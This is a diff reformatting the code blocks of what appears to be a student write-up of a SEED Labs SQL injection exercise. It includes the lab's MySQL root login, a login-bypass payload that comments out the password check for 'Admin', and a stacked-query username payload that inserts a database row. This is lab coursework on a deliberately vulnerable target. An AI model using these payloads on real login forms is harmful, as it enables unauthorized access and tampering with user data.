@@ -7,22 +7,17 @@
 //code
 ```sql
 
-		mysql -u root -pseedubuntu
+mysql -u root -pseedubuntu
+
+mysql> use Users;
     
-		mysql> use Users;
-    
-		mysql> show tables;
+mysql> show tables;
     
 	Use such a SQL query:
-  ```
-  
-//code
 
-	```sql
+select * from credential where Name='Alice';
 
-		select * from credential where Name='Alice';
-
-	```
+```
 
 ![Untitled](Pics/task1.png)
 
@@ -37,12 +32,13 @@
 	We will result in SQL Query
   
 //code
-
-		SELECT id, name, eid, salary, birth, ssn, address, email, nickname, password
+```sql
+SELECT id, name, eid, salary, birth, ssn, address, email, nickname, password
     
-		FROM credential
+FROM credential
     
-		WHERE name='Admin' #' && password='xyz'
+WHERE name='Admin' #' && password='xyz'
+```
     
 --> Task 2.2
 
@@ -66,13 +62,14 @@
 
 ```sql
 
-	INSERT INTO credential (name,eid) VALUES('abc', '17422');
+INSERT INTO credential (name,eid) VALUES('abc', '17422');
   
-	After row inserted, go to browser and input as:
+After row inserted, go to browser and input as:
   
-	.USERNAME: "1=1; INSERT INTO credential (name,eid) VALUES('abc','17422') #"
+.USERNAME: "1=1; INSERT INTO credential (name,eid) VALUES('abc','17422') #"
   
-	.PASSWORD: "" (blank field)
+.PASSWORD: "" (blank field)
+```
 
 ![Untitled](Pics/task2.3.png)
 
